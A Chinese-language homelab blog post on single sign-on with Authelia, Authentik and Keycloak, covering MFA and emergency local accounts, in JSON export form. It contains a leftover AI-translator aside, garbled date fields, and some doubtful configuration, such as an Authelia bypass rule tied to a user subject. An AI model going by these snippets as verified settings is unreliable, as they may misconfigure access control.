硬件安全密钥 用于验证的物理设备： Authentik： 用户菜单 → 设置 MFA 设备 → 注册 选择 WebAuthn 插入安全密钥（YubiKey 等） 提示时触摸密钥 热门硬件密钥： YubiKey 5（$45-50）- USB-A/C、NFC YubiKey 5C Nano（$55）- 留在 USB-C 端口 Google Titan（$30）- USB-A/C、蓝牙 Feitian（$20-30）- 预算选项 3. TOTP（验证器应用程序） 来自应用程序的基于时间的代码： Authelia（内置）： 登录任何受保护的服务 点击「注册设备」 使用验证器应用程序扫描 QR 码 输入 6 位数代码进行验证 Authentik： 用户菜单 → 设置 MFA 设备 → 注册 选择 TOTP 扫描 QR 码 推荐的验证器应用程序： Aegis（Android）- 开源、加密备份 Raivo OTP（iOS）- 开源、iCloud 同步 2FAS（iOS/Android）- 免费、云备份 Authy（iOS/Android）- 多设备同步 Google Authenticator（iOS/Android）- 简单、云备份 💡 MFA 最佳实践优先顺序： Passkeys - 最安全且方便（使用生物识别） 硬件密钥 - 非常安全，需要物理设备 TOTP 应用程序 - 安全，但可能被钓鱼 避免 SMS - 容易受到 SIM 卡交换攻击 建议： 管理员始终需要 MFA（使用 passkeys 或硬件密钥） 家人可选（减少摩擦，passkeys 很容易） 备份代码 - 生成并安全存储 多种方法 - 注册 passkey + TOTP 作为备份 Passkeys 同步 - 使用 iCloud/Google 从所有设备访问 启用 SSO 后是否应保留本地账户？ 简短答案：是的，始终保留本地账户作为备份。 为什么保留本地账户？ **SSO 是单点故障。**如果你的 SSO 系统故障，你将被锁定在所有内容之外。 SSO 故障的现实世界场景： SSO 容器崩溃 - Docker/Kubernetes 问题 数据库损坏 - Authelia/Authentik 数据库问题 配置错误 - 配置中的错字破坏验证 证书过期 - HTTPS 证书过期，SSO 无法访问 网络问题 - DNS 问题、反向代理故障 意外删除 - 哎呀，删除了错误的容器 没有本地账户会发生什么： SSO 故障 → 无法登录任何内容 → 甚至无法访问 SSO 进行修复 → 被锁定 有本地账户作为备份： SSO 故障 → 使用本地管理员账户 → 修复 SSO → 恢复正常 本地账户的最佳实践 🔒 关键：保护你的本地账户本地账户绕过 SSO，因此必须受到保护： 强密码 - 使用密码管理器，20+ 个字符 在本地账户上启用 MFA - 许多服务支持此功能 限制本地账户 - 仅为管理员/紧急访问创建 不同的密码 - 不要重复使用 SSO 密码 记录凭证 - 安全存储（密码管理器、加密文件） 支持本地账户 MFA 的服务 Proxmox： # 为本地 root 账户启用 TOTP # 数据中心 → 权限 → 双因素 # 为用户 root@pam 添加 TOTP Nextcloud： 设置 → 安全性 → 双因素验证 即使对本地管理员账户也启用 TOTP Grafana： # grafana.ini [auth] login_maximum_inactive_lifetime_duration &#x3D; 7d login_maximum_lifetime_duration &#x3D; 30d # 本地管理员仍可通过验证器应用程序使用 MFA Home Assistant： # configuration.yaml auth_providers: - type: homeassistant # 本地账户 - type: command_line # SSO 集成 # 在 UI 中为本地账户启用 MFA： # 个人资料 → 安全性 → 多因素验证 配置策略 选项 1：双重验证（推荐） 允许 SSO 和本地登录： &#x2F;&#x2F; Nextcloud - 不隐藏密码表单 &#39;oidc_login_hide_password_form&#39; &#x3D;&gt; false, &#x2F;&#x2F; 保持本地登录可见 &#39;oidc_login_auto_redirect&#39; &#x3D;&gt; false, &#x2F;&#x2F; 不强制 SSO 选项 2：隐藏本地登录 隐藏本地登录但通过直接 URL 保持可访问： &#x2F;&#x2F; Nextcloud - 隐藏但保持功能 &#39;oidc_login_hide_password_form&#39; &#x3D;&gt; true, &#x2F;&#x2F; 隐藏本地登录 &#x2F;&#x2F; 访问本地登录：https:&#x2F;&#x2F;nextcloud.local&#x2F;login?direct&#x3D;1 选项 3：仅 SSO 加紧急账户 对所有人强制 SSO，除了一个紧急管理员： # Authelia - 紧急访问绕过 SSO access_control: rules: - domain: &quot;*.homelab.local&quot; policy: bypass subject: - &quot;user:emergency-admin&quot; resources: - &quot;^&#x2F;admin&#x2F;emergency.*$&quot; 紧急访问检查清单 [ ] 每个关键服务上都存在本地管理员账户 [ ] 所有本地账户都有强唯一密码 [ ] 在支持的本地账户上启用 MFA [ ] 凭证记录在安全位置（密码管理器） [ ] 每月测试本地登录以确保其工作 [ ] 记录恢复程序 - 如何修复 SSO [ ] SSO 配置的备份 - 可以快速恢复 💡 黄金法则始终维护安全的后门： SSO 是你的前门（方便、安全） 本地账户是你的紧急出口（很少使用，始终可用） 两者都应使用 MFA 保护 定期测试两者 把它想象成在房子外面藏一把备用钥匙 - 你很少需要它，但当你需要时，你会很高兴它在那里！ 资源 **Authelia 文档：**完整的 Authelia 指南 **Authentik 文档：**Authentik 设置和配置 **Keycloak 文档：**企业 SSO 指南 **OIDC 说明：**理解 OpenID Connect 结论 在家中设置 SSO 将你的家庭实验室从一系列独立服务转变为统一平台。初始设置投资立即通过便利性和改进的安全性得到回报。 关键要点： SSO 消除了多个服务的密码疲劳 Authelia 最适合简单设置，配合反向代理 Authentik 提供完整功能，配有美观的 UI 转发验证保护任何服务 MFA 添加关键安全层 LDAP 集成可扩展用于更大的部署 定期备份至关重要（SSO 是单点故障） 家庭实验室 SSO 限于自托管服务 - SaaS 集成需要昂贵的企业计划 联合（OIDC/SAML）实现跨系统 SSO，但 WIA 是非联合的 快速入门建议： 对于大多数家庭实验室： 从 Authelia + Traefik 开始（最简单的路径） 最初使用基于文件的身份验证 为管理员账户添加 MFA 逐步将服务迁移到 SSO 如果以后需要 OIDC/SAML，考虑 Authentik 从 2-3 个服务开始，熟悉流程，然后扩展。当你不再需要处理数十个密码时，未来的你会感谢你！🔐","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/tags/Cybersecurity/"},{"name":"Homelab","slug":"Homelab","permalink":"https://neo01.com/tags/Homelab/"},{"name":"Authentication","slug":"Authentication","permalink":"https://neo01.com/tags/Authentication/"},{"name":"SSO","slug":"SSO","permalink":"https://neo01.com/tags/SSO/"}],"lang":"zh-CN"},{"title":"在家中建立單一登入系統","slug":"2025/01/Single-Sign-On-at-Home-zh-TW","date":"un33fin33","updated":"un00fin00","comments":false,"path":"/zh-TW/2025/01/Single-Sign-On-at-Home/","permalink":"https://neo01.com/zh-TW/2025/01/Single-Sign-On-at-Home/","excerpt":"厭倦了管理家庭實驗室服務的數十個密碼？學習如何建立單一登入系統，只需一次登入即可存取所有服務。","text":"你已經建立了一個令人印象深刻的家庭實驗室——Nextcloud、Jellyfin、Home Assistant、Portainer、Grafana，以及十幾個其他服務。每個都很棒。每個也都有自己的登入頁面。以及自己的密碼。以及自己的工作階段逾時。 聽起來很熟悉嗎？歡迎來到密碼疲勞的世界。 如果你可以登入一次就存取所有內容呢？這就是單一登入（SSO），它不再只是企業專用。 為什麼在家中需要 SSO？ 問題所在： 15+ 個服務 = 15+ 個要記住的密碼（或重複使用 😱） 分別登入每個服務浪費時間 沒有集中式使用者管理 需要時難以撤銷存取權限 密碼重設是一場惡夢 解決方案： SSO 提供： 一次登入適用於所有服務 集中式身分驗證 - 在一個地方管理使用者 更好的安全性 - 一次強制執行 MFA，適用於所有地方 更容易的入職 - 一次將家人/朋友加入所有服務 快速撤銷 - 停用一個帳戶，鎖定所有地方 理解 SSO 基礎 什麼是單一登入？ SSO 是一種身分驗證方案，允許使用者登入一次並存取多個應用程式，無需重新驗證。 簡單範例： 沒有 SSO：登入 Nextcloud → 登入 Grafana → 登入 Jellyfin（3 次登入） 有 SSO：登入一次 → 存取所有三個服務（1 次登入） 關鍵元件說明 將 SSO 想像成一個有多個 VIP 房間的夜店。讓我們分解每個元件： 1. 身分提供者（IdP）- 保全 **它的作用：**驗證你是誰的中央身分驗證機構。 **現實世界類比：**就像夜店入口的保全，檢查你的身分證並給你一個手環。 在你的家庭實驗室中： Authelia、Authentik 或 Keycloak 充當保全 當你嘗試存取任何服務時，你會先被重新導向到這裡 它檢查你的使用者名稱/密碼和 MFA 一旦驗證，它會給你一個「令牌」（就像手環） 範例流程： 你 → 嘗試存取 Nextcloud Nextcloud → &quot;我不認識你，去問保全&quot; 你 → 重新導向到 Authelia 登入頁面 Authelia → &quot;出示你的憑證&quot; 你 → 輸入密碼 + MFA 代碼 Authelia → &quot;已驗證！這是你的令牌&quot; 2. 服務提供者（SP）- VIP 房間 **它的作用：**信任 IdP 驗證使用者的實際應用程式。 **現實世界類比：**就像夜店中的 VIP 房間。他們不檢查你的身分證——他們只看保全給的手環。 在你的家庭實驗室中： **你的應用程式：**Nextcloud、Grafana、Jellyfin、Home Assistant 它們不自己處理密碼 它們信任 IdP 的決定 它們只檢查：“你有來自 Authelia 的有效令牌嗎？” 範例： 你 → 存取 Grafana（帶有來自 Authelia 的令牌） Grafana → &quot;我看到你有來自 Authelia 的有效令牌&quot; Grafana → &quot;Authelia 說你是 &#39;alice&#39;，在 &#39;admins&#39; 群組中&quot; Grafana → &quot;歡迎！&quot; 3. 使用者目錄 - 賓客名單 **它的作用：**儲存使用者資訊（使用者名稱、密碼、群組）。 **現實世界類比：**保全檢查的賓客名單。 在你的家庭實驗室中： **簡單：**包含使用者名稱和雜湊密碼的 YAML 檔案 **進階：**LDAP 伺服器（就像使用者的資料庫） 包含：使用者名稱、密碼、電子郵件、群組成員資格 範例結構： users: alice: password: (雜湊) email: alice@home.local groups: [admins, users] bob: password: (雜湊) email: bob@home.local groups: [users] 4. 身分驗證 vs 授權 **身分驗證：**證明你是誰（“你是 Alice 嗎？”） **授權：**決定你可以做什麼（“Alice 可以存取管理面板嗎？”） 現實世界類比： 身分驗證 = 出示身分證證明你已滿 21 歲 授權 = 保全決定你是否可以進入 VIP 區 在 SSO 中： IdP 處理身分驗證：“是的，這是 Alice，密碼正確” 應用程式處理授權：“Alice 在 ‘admins’ 群組中，授予管理員存取權限” 5. 身分驗證協定 - 語言 **它們的作用：**IdP 和應用程式通訊的標準化方式。 **現實世界類比：**就像保全和 VIP 房間用來溝通的不同語言。 OIDC（OpenID Connect）- 現代且推薦： 身分驗證：“你是誰？” 授權：“你在哪些群組中？” 使用 JSON（易於閱讀） 建立在 OAuth2 之上 大多數現代應用程式支援 盡可能使用此協定 OIDC 令牌範例： &#123; &quot;sub&quot;: &quot;alice&quot;, &quot;email&quot;: &quot;alice@homelab.local&quot;, &quot;groups&quot;: [&quot;admins&quot;, &quot;users&quot;], &quot;exp&quot;: 1705334400 &#125; SAML - 企業標準： 就像說正式的法律語言 使用 XML（冗長） 較舊的企業應用程式使用它 更複雜但廣泛支援 在企業環境中常見 Windows 整合式身分驗證（WIA）- 僅限 Windows： 使用 Kerberos/NTLM Windows 網域使用者自動登入 在網域上無需密碼提示 **僅適用於：**Active Directory + Windows 用戶端 非聯合式 - 無法與外部 SaaS 應用程式整合 不適合家庭實驗室，除非你執行 Windows Server 網域 6. 聯合式 vs 非聯合式身分驗證 什麼是聯合？ 聯合允許不同組織/系統相互信任彼此的身分驗證。 現實世界類比： **非聯合式：**你的健身房會員資格只在你的健身房有效 **聯合式：**你的護照在多個國家有效（它們相互信任） 非聯合式身分驗證（WIA、基本驗證）： 你的家庭實驗室 IdP → 僅適用於你的家庭實驗室服務 ❌ 無法向外部 SaaS（GitHub、AWS 等）進行身分驗證 聯合式身分驗證（OIDC、SAML）： 你的家庭實驗室 IdP ↔ 外部 SaaS（如果它們支援） ✅ 可以向信任你的 IdP 的服務進行身分驗證 範例場景： 非聯合式（WIA）： 你 → Windows 網域控制器 → 家庭實驗室應用程式 ✅ 你 → Windows 網域控制器 → GitHub ❌（GitHub 不信任你的 DC） 聯合式（OIDC/SAML）： 你 → Authentik → 家庭實驗室應用程式 ✅ 你 → Authentik → GitHub Enterprise ✅（如果已設定） 你 → Authentik → AWS ✅（如果已設定） 家庭實驗室的陷阱： 大多數 SaaS 提供者僅支援企業訂閱的聯合： 服務 免費/個人 企業 GitHub 無 SSO 使用 SAML 的 SSO AWS 無 SSO 使用 SAML 的 SSO Google Workspace 無 SSO 使用 SAML 的 SSO Microsoft 365 無 SSO 使用 SAML 的 SSO Slack 無 SSO 使用 SAML 的 SSO 成本現實： GitHub Enterprise：$21/使用者/月 AWS SSO：需要 AWS Organizations Google Workspace：$12-18/使用者/月（SSO） Microsoft 365：$22/使用者/月（SSO） ⚠️ 家庭實驗室 SSO 限制你的家庭實驗室 SSO 將適用於： ✅ 自架服務（Nextcloud、Grafana、Jellyfin） ✅ 你控制的服務 ✅ 支援 OIDC/SAML 且無限制的應用程式 你的家庭實驗室 SSO 將不適用於： ❌ 免費層 SaaS（GitHub、Gmail、Slack） ❌ 需要企業訂閱的服務 ❌ 不支援自訂 IdP 的服務 這將家庭實驗室 SSO 限制為僅內部服務，但對於管理 10-20 個自架應用程式仍然很有價值！ 比較： 協定 最適合 複雜度 聯合式 家庭實驗室友善 OIDC 現代應用程式 低 ✅ 是 ✅ 是 SAML 企業應用程式 高 ✅ 是 ⚠️ 如果需要 WIA Windows 網域 中 ❌ 否 ❌ 過度 💡 協定選擇對於家庭實驗室： 使用 OIDC 適用於支援它的應用程式（Grafana、Nextcloud、Portainer） 使用轉發驗證（Authelia）適用於不支援 OIDC 的應用程式 跳過 WIA，除非你已經執行 Active Directory（而且它無法與 SaaS 一起使用） 僅在特定應用程式需要時使用 SAML **接受限制：**你的 SSO 無法與免費層 SaaS（GitHub、Gmail 等）一起使用 視覺化比較： flowchart LR A[\"👤 使用者\"] -->|\"1. 登入請求\"| B[\"🔐 IdP(Authelia)\"] B -->|\"2. 檢查憑證\"| C[\"📚 使用者目錄(YAML/LDAP)\"] C -->|\"3. 有效使用者\"| B B -->|\"4. 發行令牌(OIDC/SAML)\"| A A -->|\"5. 出示令牌\"| D[\"📦 服務提供者(Nextcloud)\"] D -->|\"6. 驗證令牌\"| B B -->|\"7. 令牌有效\"| D D -->|\"8. 授予存取權限\"| A style B fill:#e3f2fd style C fill:#f3e5f5 style D fill:#e8f5e9 整合在一起 沒有 SSO（目前狀態）： 你 → Nextcloud → 輸入 Nextcloud 的密碼 你 → Grafana → 輸入 Grafana 的密碼 你 → Jellyfin → 輸入 Jellyfin 的密碼 （15 個服務 &#x3D; 15 個密碼！） 有 SSO（設定後）： 你 → Nextcloud → 重新導向到 Authelia → 登入一次 你 → Grafana → 已登入（令牌存在） 你 → Jellyfin → 已登入（令牌存在） （1 次登入 &#x3D; 存取所有內容！） **魔法：**一旦你登入 Authelia，它會建立一個工作階段。你的所有應用程式都會向 Authelia 檢查：“這個使用者已登入嗎？” Authelia 說&quot;是的！&quot;然後它們讓你進入。 🎯 關鍵要點 IdP（Authelia） = 你登入的唯一地方 服務提供者（你的應用程式） = 信任 IdP 的決定 使用者目錄 = 儲存使用者名稱/密碼的地方 協定（OIDC/SAML） = 它們如何相互通訊 你在 IdP 登入一次，你的所有應用程式都信任該登入。 自架 vs 外部身分提供者 在深入研究自架解決方案之前，你可能會想：“為什麼不直接使用 Google、Microsoft 或 GitHub 作為我的 IdP？” 外部 IdP（Google、Microsoft、GitHub、Auth0） 優點： 零維護 已經有帳戶 企業級安全性 個人使用免費 內建 MFA 可以與 SaaS 聯合（如果你有企業訂閱） 缺點： 隱私問題 - 外部提供者看到你對家庭實驗室的每次登入 網際網路依賴 - 如果網際網路中斷，無法進行身分驗證 服務中斷 - 當他們的服務中斷時，你的家庭實驗室會中斷 帳戶連結 - 沒有外部帳戶就無法新增使用者 服務條款 - 受其規則和變更約束 資料主權 - 身分驗證資料離開你的網路 限於其生態系統 - 無法將 Google SSO 用於 Microsoft 服務 自架 IdP（Authelia、Authentik、Keycloak） 優點： 完全隱私 - 無外部追蹤 離線工作 - 網際網路中斷不影響本地服務 完全控制 - 你的規則，你的使用者 自訂使用者 - 新增家人/朋友而無需 Google 帳戶 無供應商鎖定 - 擁有你的身分驗證基礎設施 學習機會 - 了解 SSO 的運作方式 聯合協定 - 使用 OIDC/SAML（標準協定） 缺點： 需要設定和維護 你負責安全性 需要管理備份 比&quot;使用 Google 登入&quot;按鈕更複雜 有限的 SaaS 整合 - 大多數 SaaS 需要昂貴的企業計劃才能接受你的 IdP 混合方法 兩全其美： # Authentik 可以使用外部 IdP 作為來源 # 使用者可以選擇：本地帳戶或 Google 或 GitHub 使用案例： 自架主要 + 外部作為備份 家人的本地帳戶 + 訪客的外部帳戶 敏感服務的自架 + 低風險應用程式的外部 💡 何時使用外部 IdP使用外部 IdP 如果： 你可以接受 Google/Microsoft 看到你的登入活動 你的家庭實驗室始終連接網際網路 你只需要為自己進行身分驗證 你想要零維護 你有企業訂閱並想與 SaaS 整合 使用自架如果： 隱私很重要（無外部追蹤） 你想要離線功能 你需要管理多個使用者（家人/朋友） 你想學習和控制你的基礎設施 你有不應暴露給外部提供者的服務 你只需要自架服務的 SSO（常見的家庭實驗室情況） 現實世界範例： 場景 1 - ISP 中斷： 使用外部 IdP，你無法登入本地 Home Assistant 檢查安全攝影機。使用自架 SSO，本地網路上的一切仍然正常運作。 場景 2 - SaaS 整合： 你想為 GitHub 使用家庭實驗室 SSO。GitHub 需要 Enterprise（$21/使用者/月）才能接受自訂 SAML IdP。對於家庭實驗室來說，這太貴了，所以你將使用 GitHub 自己的身分驗證。 選擇你的 SSO 解決方案 選項 1：Authelia（輕量級，基於代理） **最適合：**簡單設定，反向代理使用者 優點： 輕量級（單一二進位檔） 適用於任何反向代理（Traefik、nginx） 簡單的 YAML 設定 內建 LDAP/檔案式驗證 優秀的文件 缺點： 有限的 OIDC 支援（基本） 無管理 UI（僅設定檔） 比 Authentik 更少的整合 選項 2：Authentik（功能齊全，現代） **最適合：**複雜設定，需要多種協定 優點： 美觀的管理 UI 完整的 OIDC 和 SAML 支援 內建使用者管理 可自訂的登入流程 積極開發 缺點： 較重的資源使用 更複雜的設定 需要 PostgreSQL/Redis 選項 3：Keycloak（企業級） **最適合：**大型家庭實驗室，企業功能 優點： 業界標準 全面的功能 優秀的 SAML/OIDC 支援 使用者聯合 缺點： 重度資源使用（基於 Java） 複雜的設定 對小型家庭實驗室來說過度 比較表 功能 Authelia Authentik Keycloak 資源使用 低 中 高 設定複雜度 低 中 高 OIDC 支援 基本 完整 完整 SAML 支援 ❌ 否 ✅ 是 ✅ 是 管理 UI ❌ 否 ✅ 是 ✅ 是 MFA ✅ TOTP、WebAuthn ✅ TOTP、WebAuthn、Passkey ✅ 所有類型 最適合 小型實驗室 中型實驗室 企業 💡 建議 從 Authelia 開始，如果你使用 Traefik/nginx 並想要簡單性 選擇 Authentik，如果你需要 OIDC/SAML 並想要 UI 僅在需要企業功能或已經了解時使用 Keycloak 由於文章很長，我將繼續翻譯剩餘部分。讓我知道是否需要繼續，或者你想要我現在創建簡體中文版本。 設定 Authelia 架構 flowchart TD User[\"👤 使用者\"] Proxy[\"🚪 反向代理 (Traefik/nginx)\"] Authelia[\"🔐 Authelia\"] LDAP[\"📚 使用者目錄 (YAML/LDAP)\"] subgraph Services[\" \"] App1[\"📦 Nextcloud\"] App2[\"🎬 Jellyfin\"] App3[\"📊 Grafana\"] end User --> Proxy Proxy --> Authelia Proxy --> Services Authelia -.-> LDAP style Authelia fill:#e3f2fd style Proxy fill:#fff3e0 style LDAP fill:#f3e5f5 style Services fill:#e8f5e9 先決條件 Docker 和 Docker Compose 反向代理（Traefik 或 nginx） 網域名稱（或本地 DNS） 步驟 1：建立目錄結構 mkdir -p authelia&#x2F;&#123;config,secrets&#125; cd authelia 步驟 2：產生密鑰 # JWT 密鑰 tr -cd &#39;[:alnum:]&#39; &lt; &#x2F;dev&#x2F;urandom | fold -w &quot;64&quot; | head -n 1 &gt; secrets&#x2F;jwt_secret # 工作階段密鑰 tr -cd &#39;[:alnum:]&#39; &lt; &#x2F;dev&#x2F;urandom | fold -w &quot;64&quot; | head -n 1 &gt; secrets&#x2F;session_secret # 儲存加密金鑰 tr -cd &#39;[:alnum:]&#39; &lt; &#x2F;dev&#x2F;urandom | fold -w &quot;64&quot; | head -n 1 &gt; secrets&#x2F;storage_encryption_key 步驟 3：建立設定 # config&#x2F;configuration.yml --- theme: dark default_2fa_method: &quot;totp&quot; server: host: 0.0.0.0 port: 9091 log: level: info totp: issuer: homelab.local period: 30 skew: 1 authentication_backend: file: path: &#x2F;config&#x2F;users_database.yml password: algorithm: argon2id iterations: 1 salt_length: 16 parallelism: 8 memory: 64 access_control: default_policy: deny rules: - domain: &quot;*.homelab.local&quot; policy: two_factor session: name: authelia_session domain: homelab.local expiration: 1h inactivity: 5m remember_me_duration: 1M regulation: max_retries: 3 find_time: 2m ban_time: 5m storage: encryption_key_secret_file: &#x2F;secrets&#x2F;storage_encryption_key local: path: &#x2F;config&#x2F;db.sqlite3 notifier: filesystem: filename: &#x2F;config&#x2F;notification.txt 步驟 4：建立使用者 # config&#x2F;users_database.yml users: alice: displayname: &quot;Alice Smith&quot; password: &quot;$argon2id$v&#x3D;19$m&#x3D;65536,t&#x3D;3,p&#x3D;4$...&quot; email: alice@homelab.local groups: - admins - users bob: displayname: &quot;Bob Jones&quot; password: &quot;$argon2id$v&#x3D;19$m&#x3D;65536,t&#x3D;3,p&#x3D;4$...&quot; email: bob@homelab.local groups: - users 產生密碼雜湊： docker run --rm authelia&#x2F;authelia:latest authelia crypto hash generate argon2 --password &#39;yourpassword&#39; 步驟 5：Docker Compose # docker-compose.yml version: &#39;3.8&#39; services: authelia: image: authelia&#x2F;authelia:latest container_name: authelia volumes: - .&#x2F;config:&#x2F;config - .&#x2F;secrets:&#x2F;secrets ports: - 9091:9091 environment: - TZ&#x3D;America&#x2F;New_York restart: unless-stopped 步驟 6：與 Traefik 整合 # docker-compose.yml（加入現有的 Traefik 設定） services: authelia: image: authelia&#x2F;authelia:latest container_name: authelia volumes: - .&#x2F;authelia&#x2F;config:&#x2F;config - .&#x2F;authelia&#x2F;secrets:&#x2F;secrets labels: - &quot;traefik.enable&#x3D;true&quot; - &quot;traefik.http.routers.authelia.rule&#x3D;Host(&#96;auth.homelab.local&#96;)&quot; - &quot;traefik.http.routers.authelia.entrypoints&#x3D;websecure&quot; - &quot;traefik.http.routers.authelia.tls&#x3D;true&quot; - &quot;traefik.http.services.authelia.loadbalancer.server.port&#x3D;9091&quot; # Authelia 中介軟體 - &quot;traefik.http.middlewares.authelia.forwardauth.address&#x3D;http:&#x2F;&#x2F;authelia:9091&#x2F;api&#x2F;verify?rd&#x3D;https:&#x2F;&#x2F;auth.homelab.local&quot; - &quot;traefik.http.middlewares.authelia.forwardauth.trustForwardHeader&#x3D;true&quot; - &quot;traefik.http.middlewares.authelia.forwardauth.authResponseHeaders&#x3D;Remote-User,Remote-Groups,Remote-Name,Remote-Email&quot; restart: unless-stopped # 受保護服務範例 nextcloud: image: nextcloud:latest labels: - &quot;traefik.enable&#x3D;true&quot; - &quot;traefik.http.routers.nextcloud.rule&#x3D;Host(&#96;nextcloud.homelab.local&#96;)&quot; - &quot;traefik.http.routers.nextcloud.entrypoints&#x3D;websecure&quot; - &quot;traefik.http.routers.nextcloud.tls&#x3D;true&quot; - &quot;traefik.http.routers.nextcloud.middlewares&#x3D;authelia@docker&quot; restart: unless-stopped 步驟 7：啟動服務 docker-compose up -d 造訪 https://auth.homelab.local 查看登入頁面。 理解身分驗證流程 現在你已經設定好 Authelia，讓我們看看當你存取受保護的服務時到底發生了什麼： sequenceDiagram participant User participant App as 應用程式 (Nextcloud) participant SSO as SSO 提供者 (Authelia) participant LDAP as 使用者目錄 (YAML/LDAP) User->>App: 1. 存取應用程式 App->>User: 2. 重新導向到 SSO 登入 User->>SSO: 3. 輸入憑證 + MFA SSO->>LDAP: 4. 驗證憑證 LDAP->>SSO: 5. 使用者已驗證 SSO->>App: 6. 回傳驗證令牌 App->>User: 7. 授予存取權限 Note over User,App: 使用者現在已登入！ User->>App: 8. 存取另一個應用程式 (Jellyfin) App->>SSO: 9. 檢查現有工作階段 SSO->>App: 10. 有效工作階段存在 App->>User: 11. 授予存取權限（無需登入） 幕後發生的事情： **首次存取：**你造訪 nextcloud.homelab.local **Traefik 攔截：**向 Authelia 檢查 - “這個使用者已驗證嗎？” **未驗證：**Authelia 將你重新導向到 auth.homelab.local **你登入：**輸入使用者名稱、密碼和 MFA 代碼 **Authelia 驗證：**對照使用者資料庫檢查憑證 **建立工作階段：**Authelia 建立工作階段 cookie **重新導向回來：**你被送回 Nextcloud **授予存取權限：**Traefik 看到有效工作階段，允許存取 第二個服務存取： 你造訪 grafana.homelab.local Traefik 向 Authelia 檢查 - “這個使用者已驗證嗎？” Authelia 看到現有工作階段 cookie - “是的，是 Alice！” 立即授予存取權限 - 無需登入 這就是 SSO 的魔法 - 一次登入，到處存取！ 新增多因素驗證 MFA 選項概覽 方法 安全性 便利性 成本 防釣魚 Passkey (WebAuthn) 最高 高 免費 ✅ 是 硬體金鑰 最高 中 $25-50 ✅ 是 TOTP（驗證器應用程式） 高 中 免費 ❌ 否 SMS 低 高 需要 SMS 閘道 ❌ 否 1. Passkey（WebAuthn）- 推薦 什麼是 Passkey？ Passkey 是使用生物辨識驗證（指紋、臉部、PIN）的密碼現代替代品。 **現實世界類比：**就像使用指紋解鎖手機，而不是輸入密碼。 運作方式： 你的裝置儲存加密金鑰 你使用生物辨識（指紋/臉部）或裝置 PIN 進行驗證 沒有密碼可以被竊取或釣魚 透過雲端同步跨裝置運作（iCloud 鑰匙圈、Google 密碼管理員） Authentik 設定： 使用者選單 → 設定 MFA 裝置 → 註冊 選擇 WebAuthn 或 Passkey 按照瀏覽器提示： **行動裝置：**使用指紋/Face ID **筆記型電腦：**使用 Touch ID/Windows Hello **桌上型電腦：**使用手機作為 passkey 或硬體金鑰 Authelia 設定： 登入任何受保護的服務 點擊「註冊安全金鑰」 選擇 passkey 選項 使用生物辨識進行驗證 支援的平台： ✅ iPhone/iPad（iOS 16+）- Face ID/Touch ID ✅ Android（9+）- 指紋/臉部解鎖 ✅ macOS（Ventura+）- Touch ID ✅ Windows（10+）- Windows Hello ✅ Chrome/Edge/Safari - 內建支援 2. 硬體安全金鑰 用於驗證的實體裝置： Authentik： 使用者選單 → 設定 MFA 裝置 → 註冊 選擇 WebAuthn 插入安全金鑰（YubiKey 等） 提示時觸碰金鑰 熱門硬體金鑰： YubiKey 5（$45-50）- USB-A/C、NFC YubiKey 5C Nano（$55）- 留在 USB-C 埠 Google Titan（$30）- USB-A/C、藍牙 Feitian（$20-30）- 預算選項 3. TOTP（驗證器應用程式） 來自應用程式的基於時間的代碼： Authelia（內建）： 登入任何受保護的服務 點擊「註冊裝置」 使用驗證器應用程式掃描 QR 碼 輸入 6 位數代碼進行驗證 Authentik： 使用者選單 → 設定 MFA 裝置 → 註冊 選擇 TOTP 掃描 QR 碼 推薦的驗證器應用程式： Aegis（Android）- 開源、加密備份 Raivo OTP（iOS）- 開源、iCloud 同步 2FAS（iOS/Android）- 免費、雲端備份 Authy（iOS/Android）- 多裝置同步 Google Authenticator（iOS/Android）- 簡單、雲端備份 💡 MFA 最佳實踐優先順序： Passkeys - 最安全且方便（使用生物辨識） 硬體金鑰 - 非常安全，需要實體裝置 TOTP 應用程式 - 安全，但可能被釣魚 避免 SMS - 容易受到 SIM 卡交換攻擊 建議： 管理員始終需要 MFA（使用 passkeys 或硬體金鑰） 家人可選（減少摩擦，passkeys 很容易） 備份代碼 - 產生並安全儲存 多種方法 - 註冊 passkey + TOTP 作為備份 Passkeys 同步 - 使用 iCloud/Google 從所有裝置存取 啟用 SSO 後是否應保留本地帳戶？ 簡短答案：是的，始終保留本地帳戶作為備份。 為什麼保留本地帳戶？ **SSO 是單點故障。**如果你的 SSO 系統故障，你將被鎖定在所有內容之外。 SSO 故障的現實世界場景： SSO 容器崩潰 - Docker/Kubernetes 問題 資料庫損壞 - Authelia/Authentik 資料庫問題 設定錯誤 - 設定中的錯字破壞驗證 憑證過期 - HTTPS 憑證過期，SSO 無法存取 網路問題 - DNS 問題、反向代理故障 意外刪除 - 哎呀，刪除了錯誤的容器 沒有本地帳戶會發生什麼： SSO 故障 → 無法登入任何內容 → 甚至無法存取 SSO 進行修復 → 被鎖定 有本地帳戶作為備份： SSO 故障 → 使用本地管理員帳戶 → 修復 SSO → 恢復正常 本地帳戶的最佳實踐 🔒 關鍵：保護你的本地帳戶本地帳戶繞過 SSO，因此必須受到保護： 強密碼 - 使用密碼管理員，20+ 個字元 在本地帳戶上啟用 MFA - 許多服務支援此功能 限制本地帳戶 - 僅為管理員/緊急存取建立 不同的密碼 - 不要重複使用 SSO 密碼 記錄憑證 - 安全儲存（密碼管理員、加密檔案） 支援本地帳戶 MFA 的服務 Proxmox： # 為本地 root 帳戶啟用 TOTP # 資料中心 → 權限 → 雙因素 # 為使用者 root@pam 新增 TOTP Nextcloud： 設定 → 安全性 → 雙因素驗證 即使對本地管理員帳戶也啟用 TOTP Grafana： # grafana.ini [auth] login_maximum_inactive_lifetime_duration &#x3D; 7d login_maximum_lifetime_duration &#x3D; 30d # 本地管理員仍可透過驗證器應用程式使用 MFA Home Assistant： # configuration.yaml auth_providers: - type: homeassistant # 本地帳戶 - type: command_line # SSO 整合 # 在 UI 中為本地帳戶啟用 MFA： # 個人資料 → 安全性 → 多因素驗證 設定策略 選項 1：雙重驗證（推薦） 允許 SSO 和本地登入： &#x2F;&#x2F; Nextcloud - 不隱藏密碼表單 &#39;oidc_login_hide_password_form&#39; &#x3D;&gt; false, &#x2F;&#x2F; 保持本地登入可見 &#39;oidc_login_auto_redirect&#39; &#x3D;&gt; false, &#x2F;&#x2F; 不強制 SSO 選項 2：隱藏本地登入 隱藏本地登入但透過直接 URL 保持可存取： &#x2F;&#x2F; Nextcloud - 隱藏但保持功能 &#39;oidc_login_hide_password_form&#39; &#x3D;&gt; true, &#x2F;&#x2F; 隱藏本地登入 